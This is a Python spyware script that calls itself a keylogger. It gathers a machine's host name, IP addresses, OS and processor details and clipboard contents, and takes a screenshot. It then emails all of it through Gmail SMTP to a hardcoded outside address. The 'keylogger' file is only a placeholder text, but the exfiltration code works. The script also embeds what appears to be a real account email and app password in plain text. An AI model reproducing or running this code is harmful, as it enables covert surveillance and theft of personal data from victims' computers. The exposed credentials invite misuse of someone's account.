import socket
import platform
import datetime
import pyperclip
from PIL import ImageGrab
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

def get_system_info():
    host_name = socket.gethostname()
    private_ip = socket.gethostbyname(host_name)

    public_ip = ""
    try:
        public_ip = socket.gethostbyname(socket.getfqdn())
    except socket.gaierror:
        public_ip = "Not available"

    processor_name = platform.processor()
    windows_version = platform.platform()
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    clipboard_content = pyperclip.paste()

    system_info = f"Host Name: {host_name}\nPrivate IP: {private_ip}\nPublic IP: {public_ip}\nProcessor Name: {processor_name}\nWindows Version: {windows_version}\nCurrent Date and Time: {current_time}\nClipboard Content: {clipboard_content}"

    return system_info

def save_to_file(filename, content):
    with open(filename, 'w') as file:
        file.write(content)

def capture_and_save_screenshot(file_name="screenshot.png"):
    try:

        screenshot = ImageGrab.grab()


        screenshot.save(file_name)
        print(f"Screenshot saved as {file_name}")

    except Exception as e:
        print(f"Error in capturing and saving screenshot: {str(e)}")

def send_email(subject, message, attachment_paths=None):
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    sender_email = 's20_siddiqui_gufran@mgmcen.ac.in'
    sender_password = 'wrry eeny bqqu vlvp'
    receiver_email = 'siddiquigufran2002@gmail.com'

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))

    if attachment_paths:
        for attachment_path in attachment_paths:
            with open(attachment_path, 'rb') as file:
                attachment = MIMEApplication(file.read(), _subtype='txt')
                attachment.add_header('Content-Disposition', 'attachment', filename=attachment_path)
                msg.attach(attachment)

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        print('Email sent successfully')
    except Exception as e:
        print(f'Email could not be sent. Error: {str(e)}')
    finally:
        server.quit()

if __name__ == "__main__":
    try:
        system_info = get_system_info()
        file_name_system_info = "system_info.txt"
        save_to_file(file_name_system_info, system_info)

        screenshot_name = "screenshot.png"
        capture_and_save_screenshot(screenshot_name)


        generated_content = "This is the content of Generated.txt"
        file_name_generated = "Generated.txt"
        save_to_file(file_name_generated, generated_content)


        subject = "Keylogger file, System Information & Screenshot"
        message = "Please find the attached files of System information, Keylogger & captured screenshot."
        attachment_paths = [file_name_system_info, screenshot_name, file_name_generated]
        send_email(subject, message, attachment_paths)

        print(f"The Files have been sent to the specified Email adress")

    except Exception as e:
        print(f"An error occurred: {str(e)}")
